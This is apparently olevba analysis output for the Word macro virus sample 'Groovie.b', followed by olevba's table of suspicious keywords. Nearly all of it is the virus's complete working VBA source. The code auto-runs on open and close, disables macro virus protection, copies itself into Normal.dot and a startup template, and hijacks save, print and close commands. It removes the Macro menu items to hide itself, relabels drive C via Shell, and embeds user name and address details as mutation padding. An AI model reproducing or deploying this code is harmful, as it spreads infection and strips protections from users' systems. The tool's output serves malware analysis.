olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.b-a9997c6009c9df32ae8df76a99f55f2ea4e9d628
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.b-a9997c6009c9df32ae8df76a99f55f2ea4e9d628 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Groovie.b-a9997c6009c9df32ae8df76a99f55f2ea4e9d628 - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Public I02 As Boolean
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Public I03 As Boolean
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Public I04 As Boolean
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Public I05 As Boolean
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Public I06 As String
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Public I07 As Boolean
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Public I08 As Boolean
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Function I09()
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
On Error Resume Next
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    If MacroContainer = NormalTemplate Then
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        I01 = "normal"
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        GoTo checkout
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    End If
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
checkout:
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
End Function
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Function I10()
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
On Error Resume Next
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        If ActiveDocument.VBProject.VBComponents(I).Name = "groovie" Then I04 = True
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    Next I
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    For I = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        If NormalTemplate.VBProject.VBComponents(I).Name = "groovie" Then I03 = True
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    Next I
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
End Function
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Function I11()
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
On Error Resume Next
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Call I09
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Call I10
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    If I01 = "document" Then Call I12
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    If I01 = "normal" Then Call I13
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    If I01 = "orbit" Then Call I14
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
End Function
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Function I12()
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
On Error Resume Next
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    If I03 = False And I05 = False Then
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        With NormalTemplate.VBProject
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        With .VBComponents.Import("c:\groovie.sys")
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        End With
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        End With
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    End If
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    If I02 = False Then
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        If I08 = False Then Documents.Open FileName:=I06
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        Shell ("label c: groovie"), 0
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        Windows(1).Close
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    End If
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
End Function
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Function I13()
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
On Error Resume Next
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Application.ScreenUpdating = False
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    Call I17
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    If I04 = False And I07 = True Then
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        With ActiveDocument.VBProject
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        With .VBComponents.Import("c:\groovie.sys")
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        End With
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        End With
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        With Dialogs(wdDialogFileSummaryInfo)
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
            .Comments = "ALT-F11 says it's groovie!"
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
            .Execute
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        End With
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    End If
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    If I02 = False And I07 = True Then
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        If I08 = False Then Documents.Open FileName:=I06
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    End If
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    If I02 = False And I07 = False Then
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        Documents.Add Template:="", NewTemplate:=False
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    End If
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Application.ScreenUpdating = True
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
End Function
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Function I14()
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
On Error Resume Next
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Application.ScreenUpdating = False
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        If I03 = False And I05 = False Then
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
            With NormalTemplate.VBProject
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
            With .VBComponents.Import("c:\groovie.sys")
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
            End With
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
            End With
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
            NormalTemplate.Save
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        End If
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        If I04 = False Then
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
            With ActiveDocument.VBProject
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
            With .VBComponents.Import("c:\groovie.sys")
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
            End With
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
            End With
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
            With Dialogs(wdDialogFileSummaryInfo)
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
                .Comments = "ALT-F11 says it's groovie!"
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
                .Execute
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
            End With
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
        End If
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Application.ScreenUpdating = True
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
End Function
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Function I15()
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
On Error Resume Next
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    Options.VirusProtection = False
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    Options.SaveNormalPrompt = False
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    Options.ConfirmConversions = False
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    I06 = ActiveDocument.FullName
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
    Call I11
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
End Function
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Sub AutoOpen()
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
On Error Resume Next
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Call I15
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
End Sub
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Sub AutoClose()
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
On Error Resume Next
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
I08 = True
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Call I15
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
End Sub
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Sub AutoExit()
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
On Error Resume Next
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Call I15
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
End Sub
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Sub FileSaveAs()
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
On Error Resume Next
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Call I16
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Call I15
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Dialogs(wdDialogFileSaveAs).Show
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
End Sub
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Sub filesave()
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
On Error Resume Next
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Call I16
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Call I15
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
End Sub
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Sub fileclose()
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
On Error Resume Next
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
I08 = True
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Call I15
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
ActiveDocument.Close
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
End Sub
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Sub fileprint()
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
On Error Resume Next
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Call I15
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Dialogs(wdDialogFilePrint).Show
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
End Sub
 ' AN06.10.98 08:51:20748Andreas Novy748\\Wuw_iir\testq on NE00:
Sub viewvbcode()
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
End Sub
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
Sub ToolsMacro()
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
End Sub
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
Sub FileTemplates()
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
End Sub
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
Function I17()
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
On Error GoTo docek
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
    If ActiveDocument.Name <> "" Then
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
        I07 = True
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
    End If
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
    GoTo over
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
docek:
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
    I07 = False
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
over:
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
End Function
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
Function I16()
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
Randomize
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
rn = Int(Rnd * 999)
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
With Application.VBE.ActiveVBProject.VBComponents("Groovie").CodeModule
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
For x = 2 To 358 Step 2
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
.DeleteLines x
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & Application.UserAddress & rn & Application.ActivePrinter
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
Next x
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
End With
 ' AN06.10.98 08:51:21748Andreas Novy748\\Wuw_iir\testq on NE00:
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

